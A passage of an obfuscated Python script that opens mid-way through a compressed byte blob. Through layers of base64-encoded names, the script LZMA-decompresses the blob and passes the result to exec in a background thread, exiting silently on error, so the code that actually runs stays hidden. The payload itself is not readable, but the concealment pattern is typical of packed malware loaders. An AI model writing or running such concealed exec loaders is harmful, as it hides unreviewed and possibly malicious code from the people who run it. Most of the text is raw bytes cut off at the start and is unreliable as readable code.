a9\x1c\x15p\x99Je6\x9b\xb6\x12s\xe3\x1bEy\xaex\xb8\x01\x8a\xe8\xb8\xb2*\xf3\xea`\xd5\xa3\x89\xde\xcc"NL\x95\xe2\xa4pl^\x01>\x98\xc2=H\xe0\x16a\xc9\xde\x0e\x9f\x8c_\x8a*\xf2\xcbN\xe8T\x16\xfe\x1c\xd921\x92\xd1\xfcB#\xaf\xf8x\x02\x0fz\x8a\x8b\x0f&\xcbx\x93\x06\xbes\xfaei\x15\xab\x8a\x01\xee{\xbc\xce\x1a3s\x15\xd1\'\xdd\xd8:\xcda\xd9P\x87A `\x87\x8f\\\x05If!\x8eS/\x9fp \xa0{\x7fg\xab@\x83\\\xc2\xc3\x15\xd55d\x13\x1a\xdd\xb9\x87\xb3\xe3\xa9!\xdd\x9d\xe43\xa4\xbe\x81;P\x1d\xafiJ\xc0n\xba\x80\xf3\xb1\'\xc1\x88(\nf\xa7\xc6\xdd\x9c\x90\xfe\x89\xb54\xaa\xfc\x97\xb5\x06\x02\xd2\xfc\xf2\x97q\xbb\x14\x80\xac|\x92\n\rw(\x89Vej\xe4\xec\xcf\x13\xe6\xf5\x18\x86S-\xe0\x82\xd8\x81\'m\x8f\xc0\xf5\xc7\rY\xfe5\x17\xc33&\x13\x17b\xe9\xb3\xeb\xca3/EV\t\x17\x80\xf4\x91\xf5\x08\xf6\xf0\xf2\x0f\xdf\xa8A\x0f<\x1c5\x1bO\x83\xdf\xa0\xaa\x81\x9d,\x0b2X{\xd8\xe2\xe3\xf5\'\xef\xc3GX\x9ef\x89,X\x9b;\xaf\xf5S \x96\xd3\x91\xa8#\xe5\xbe\xa7N\x18\x8f}:  $U\xc5\xabH\xc1\xd1\x8d\xbdr\xb9Y\x92\xb8eI\xab\xe6f\xd2\x8f?\xd1\xb7\xad\xfa\xe5\xd5/-j\x01\x90G\x1b\x11\xe7\x01%l\x96\xc3\x80\x91\x8ao7\x83\xa6-q\xbe\xc6\xe4\x97(\x1f\xcb\x03.\x04D\xeb@\xb5\x1d\x93\xa7\x99\xd5T@g\x9c\xab\'3A.E\x10\x9c\x9a|\xac\xcd\x81.\x16`\x9f\r|(\xa8\xb0Q\x02\x1f \xbaLb\xbb\xe3\x94O\xad\x02iU,\xf2J\x8f\x88zs\xc5\xcd\x0bg\x83\x8b+METx-\xb7)u\x8f\xfd\x0c\xc1\xb4\r\xe2\x0co\xa69z\xb3\xbf\x03\x10\xf3`\x9a\xdbg\xd0)\x99#\xb2\xa0\xcbj\xdd\x8f\xa75\xa9\xb0\x1b\x88{\xbf{\xfb`\xde\xcc\xfd+$\x8d\x08=\xc5\xee\n\xff\xc1&X\x00\xc5\x98^V\xa6\\\x037\xf2\xb7d\xc9/\xd9|6\xddF\xf4\x0e\x02\tf\x8f)~\xdd\xe2\xb7\\`\x10\xca\xa3M\xceI\xbe>\xa1\xe8\xb7\xe0\x87\xe48ho /\xa2&\xd3\xd7\xcb;\xea\x15,\x88q\x98\x9cj\xbb>\x10R\xc4(\xdd\xab7\x8bJ\x18\xee\xf4i\xe1\xea&(2c\xcck\xc88\x8b\x12\xf7\x1b\x99\xd0Mp\xee\xa2\xe4\xbb\xf4@J/y\xee\xfa\x8b\xfeA\xf1\xe3EhS\xfdO)<:\x83<\r\xa1_L~W;q||\xce1\\\x98\x7f\x00u\xdd\xf7\x93\x1b\xed2\xe2\xea\x84\x82b@\x85E\xae\x1e\x87\xb53\xa2;\xc2)\x03>Zr\x8cmaB\x7f\xb2\xcc\x8a\x04\xc4OH\xde\xd6\xa5\x93\x901\x08\xd5j\xf1\x0e\xd4>\xfa\x82\xce\xa9<\xa8\xc2\xf07\xd9D!M`\xf4\xfa\xe8\xe5\xbd\xfc\xbc\x8c\xc5\x8f;\xaa?\xf2\xe9\x08\x8dBa\x00\x92\xd1pa!\x1e\x82^\xc0\x17\xd1\xa7$\xce\x06\xb9\x8f\xbf\x05\nw\xf2\xfaB\rG\xd8\x9cLA`\xdf\xb0q\xab\x8f\xb0_\xf1\xb1\xd6<\xae\x9b\xa2\xca\xd3\xec\x03>3\xc5\xb2\x18\xaeX8\x02\xb1\xa2\x92\x9d-)\xd7\xb5\xc8l.\xda\xb5F\xf0\xf5\xd2\xf1\xa0\xf2\xc6u\xb0\x1eW\xf3wY\xe9\xe1X+\x8d\x08\xd7\x1a\xd6\x0bg\xac<#\x11M[\xbb\xb5Z.\x18\xa87\xa5\xde\x12ml\x9c\x01\xee`\x12\xb9\x13\xb2\xab\xd0"\x83Z!$\x7f\x80%\x0e\xbe\xd1\xa8J\xd8K&\xf5\xe9\x89Hk\xaa\xce\xc3\xf4\xf6j\x825\xceS\x80#\x1e^<Zt\x0e\xfc?k\x85C\x12".\x18\x17\xac_\x99&\xdak;6\x9bi\xa9\x17\xdc\xd5\xd4\x9d\xce1+\xec\x97\xa4\xf9%\x94\xed\x9d\x03\xf8\x92\xad\xab\xbf\xd7\xd8\x02\x07\xef\xedJ\xcc\x8cP\xf9\xef\x11Fy\xe1\x1b2g\xd4<\xfe\xd5&s\xe6g\x9dL\xae\x05\xf3zM\x18d\x84U\xac\xfc\xb3\x8cSL\x8e{\x8a\xe79\xd9}\xfaQ}\xa6\xc9\xd0\xc4\x8a:\xb4\xfd"\xb8L\x15\x8db8|xq\x1f`\xf1\xf0\xd9\xbf-\xc4\xd9\xb5\x1cEr\x17\x01\x17\xda\x81\xec\x1bp)G\xe4\xd7\xdah\x8e\xbccY\x150\xa5\x94\xea\xbb\xe58a\xb8\xe4\x1a\xf0\t\x00\x9bW3\xcf+WG\xa1\xd4a\xe5[\xdc\x8e\xa5\xaf\x83\x8d\x9e47g_\x92/\x8c\xdd\x116g\xbf\xacw\x07\xdcCa}\xb9\x19\xda\xb2\x98\xe4E\xfe\xb4V\x9c\x83,N%\x01\xcc\t\xb4\x04\xf6E\x16\xf1\xf7(AN\xdc\x1f\xc0\x8c\xc1\x89bSF\x05S\r\xa8Y\x8b\xac\xec\x84\x8e;t%\\7|\xa3\x9e\x18\x8f\x07A\\r\xedyN\x84\n\xebi\xb8O\xec\xa44,\x06\x83\xf2<\xd3M\n\x16_\xa6E\xb1\xe4\x93]T\x9b_%Z\xd9\xc8\xd7,g\x1b\xe6\xc6x\xd7g\xc0w\x15K\xecK\xd5\xe1,\xd4H\xa7\xa10M\xe8\xb8\x03WF\xfcD\x91YK:S\xa6\xba\xc3\x8eF\x93\xbd>f:\x9e\xf75\x1d\x97C=\xcf\xce\xac\xc5\x81\xc1\xa0\xba~\x84f\xe69\xb8 \xc28v4\x00d\xe2I\t"\xde\x9eOZjU\xf0\xc0\x85]\x83\r\xdd8\xe3\xa7z\x0c3\xde\xbb[\n\xc1\x18\x82\x19\xbc\x9e\n\xe0\xdf\xb3\x13t\x1b3n=\xc7&\xc4L\x91H\xf2p\xbaKz\x86n\xec\xea\xa4\xcc[\xcd\xfd\xa2v(P!\x9f\x1f\xcb~\xc3\xa1\x04\x01\x10\xa8\x04\x0e&^\\\x15\xa8\xc7V\x02\xe8\xca\xd4\xb0T\x05`\x04\xa3\xa8\xe5\x9f")$Vsz\xce4xS\x1b\xab\xaeB\x19\xaem\x92\xc57\x16\x8d\xef\x84\x8c\xda`g\x16\x18\x94x\xf6\xd2\xd5\xf8K\xda\x98\xc5\x05\x057%h\xc7\x93\xc0\x850\x9fGv\x00\x89-b,Y\xc8\x12\xab\xf3\xfdSVjV\xb5&\x15Cq\xa1\xb8\xcd*\x06\x84\xc8\x11\xed\xa3\x1a\xe4\xf1\xf2\x02\xc1\xff\x87HV\xd1\xaf\xb2l\xd6-@\xf9>\x17\xc0B\xf5}wK\x89\xc3/\xb7+Z\xa8\xab\xe4HP\xc9g\xa9\x05;\x14\xabP\xa2\xb7V\xb0\x16\r\xd2\x04\'\x14\x9a<Y\xcc$\x05K\xb4(\x13\xf6\xcd\xf1\x16\x99\x11^|B\xdfib\xb4i\x1ae\xd8k\xa6\x86X\x95\x86\xfe\xcb\x1d\xba\x13\x12OF\xd2Y\x91\xb3A\x1cG;J^[Ue\x82\x0b\x01\xe14\xbe\xb9$\x1e\x88\x7fX\xc6\xbc\xde\x1a\\\xaf"\x19$"\xc0XG\xa4"Q\x8e\xf0\x92c\x82]\x9c%#\tK.\x1ba\xe0\xc1\xcboB\x9c\xc5\xf3T\x04u$3\xbfJ?\xeaaj\xcdb\x1f\x0cE\x05g\xc91c\xeb}\xec\x8a\xa3#>9\xc0p:{y\xb1\x90\xd8\xc1\xf2@gn\xc5\x03\xa4\xd6B\xb2)]?p\x86[\xa4\xa8\xa8\x95\xa9nzTC=\xacsG\xe3Y\xfc\xaf\\"\x07\xc9\xba\xdf,\x15\x0f8\xf7 \x7f\xb6\x97;\xbf\xa4\x86\x82\x14\xc1vG\x1a\xd8`\xb2\xbd\x190\xce\xed|\x7f\xf0\xc9"\xd5\x03\xa5j\xb6\x8f\xeb\xfa\x9f#\x81\xec\xac\x1fz\x06\x85\xd4\x94D\xecH\xc5\xc6A\xb0\xce\xe1I\x9e&\x1d\xb3R\x08\xfa}\xc6P\xe3k\x1ap}\xb6\x12\x84S6]\xd3y9\x1e\xbe\x01\xab\xe9\xe6jB\xd4\xa57e\x00\x00\x00\x84\x01\xafv3S\xcfU\x00\x01\xb71\xa7\x96\x01\x00\x99\xb2\xe2h\xb1\xc4g\xfb\x02\x00\x00\x00\x00\x04YZ'
    Flux_Protection_________ = Flux_Protection___________(Flux_Protection__________(Flux_Protection___________(Flux_Protection_______________(Flux________________([98, 97, 115, 101, 54, 52]).decode()), Flux________________([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(Flux________________([88, 49, 57, 112, 98, 88, 66, 118, 99, 110, 82, 102, 88, 121, 103, 105, 89, 110, 86, 112, 98, 72, 82, 112, 98, 110, 77, 105, 75, 81, 61, 61])).decode()), Flux_Protection___________(Flux_Protection_______________(Flux________________([98, 97, 115, 101, 54, 52]).decode()), Flux________________([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(Flux________________([98, 71, 108, 122, 100, 65, 61, 61])).decode())(Flux________)
    try:
        Flux_Protection___________(Flux_Protection__________(Flux_Protection___________(Flux_Protection_______________(Flux________________([98, 97, 115, 101, 54, 52]).decode()), Flux________________([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(Flux________________([88, 49, 57, 112, 98, 88, 66, 118, 99, 110, 82, 102, 88, 121, 103, 105, 89, 110, 86, 112, 98, 72, 82, 112, 98, 110, 77, 105, 75, 81, 61, 61])).decode()), Flux_Protection___________(Flux_Protection_______________(Flux________________([98, 97, 115, 101, 54, 52]).decode()), Flux________________([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(Flux________________([90, 88, 104, 108, 89, 119, 61, 61])).decode())(Flux_Protection____________(Flux_Protection___________(Flux_Protection__________(Flux_Protection___________(Flux_Protection_______________(Flux________________([98, 97, 115, 101, 54, 52]).decode()), Flux________________([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(Flux________________([88, 49, 57, 112, 98, 88, 66, 118, 99, 110, 82, 102, 88, 121, 103, 105, 98, 72, 112, 116, 89, 83, 73, 112])).decode()), Flux_Protection___________(Flux_Protection_______________(Flux________________([98, 97, 115, 101, 54, 52]).decode()), Flux________________([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(Flux________________([90, 71, 86, 106, 98, 50, 49, 119, 99, 109, 86, 122, 99, 119, 61, 61])).decode())(Flux________________(Flux_Protection_________)))) or Flux_Protection___________(Flux_Protection__________(Flux_Protection___________(Flux_Protection_______________(Flux________________([98, 97, 115, 101, 54, 52]).decode()), Flux________________([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(Flux________________([88, 49, 57, 112, 98, 88, 66, 118, 99, 110, 82, 102, 88, 121, 103, 105, 98, 51, 77, 105, 75, 81, 61, 61])).decode()), Flux_Protection___________(Flux_Protection_______________(Flux________________([98, 97, 115, 101, 54, 52]).decode()), Flux________________([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(Flux________________([88, 50, 86, 52, 97, 88, 81, 61])).decode())(0)
    except Flux_Protection___________(Flux_Protection__________(Flux_Protection___________(Flux_Protection_______________(Flux________________([98, 97, 115, 101, 54, 52]).decode()), Flux________________([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(Flux________________([88, 49, 57, 112, 98, 88, 66, 118, 99, 110, 82, 102, 88, 121, 103, 105, 98, 72, 112, 116, 89, 83, 73, 112])).decode()), Flux_Protection___________(Flux_Protection_______________(Flux________________([98, 97, 115, 101, 54, 52]).decode()), Flux________________([98, 54, 52, 100, 101, 99, 111, 100, 101]).decode())(Flux________________([84, 70, 112, 78, 81, 85, 86, 121, 99, 109, 57, 121])).decode()):...

def oto_kitap():
    p = threading.Thread(target=kitap)
    p.start()

if __name__ == "__main__":
   oto_kitap()